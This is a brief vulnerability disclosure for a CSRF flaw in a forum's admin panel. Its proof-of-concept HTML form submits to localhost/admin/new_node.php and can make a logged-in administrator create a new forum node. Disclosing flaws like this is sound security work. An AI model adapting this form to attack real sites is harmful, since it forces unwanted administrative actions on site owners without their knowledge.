# New Node CSRF
Allows to create new forum nodes through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<form action="http://localhost/admin/new_node.php" method="POST" style="padding: 25px;">
   <label for="node_title">Title</label>
   <input type="text" name="node_title" id="node_title" class="form-control">
   <label for="node_desc">Description</label>
   <textarea name="node_desc" id="node_desc" class="form-control"></textarea>
   <label for="parent">Parent</label><br>
   <select name="node_parent" id="parent">
     <option value="1">First Category</option><option value="&amp;1">&nbsp;&nbsp;&nbsp;&nbsp;-First Node</option>
   </select>
   <br>
   <label for="additional_option">Additional Options</label><br>
   <input type="checkbox" name="lock_node" value="1" id="lock_node"> <label style="font-weight: normal;" for="lock_node">Lock Node</label>
   <br>
   <label for="allowed_usergroups">Allowed Usergroups</label>
   <br>
   <input type="checkbox" name="allowed_ug[]" value="1" checked=""> User<br><input type="checkbox" name="allowed_ug[]" value="2" checked=""> Banned<br><input type="checkbox" name="allowed_ug[]" value="3" checked=""> Moderator<br><input type="checkbox" name="allowed_ug[]" value="4" checked=""> Administrator<br>
   <label for="labels">Labels</label> <small>Each Line is a new label. HTML enabled.</small>
   <textarea name="labels" id="labels" class="form-control"></textarea><br>
   <input type="submit" name="create" value="Create Node" class="btn btn-default">
</form>
```
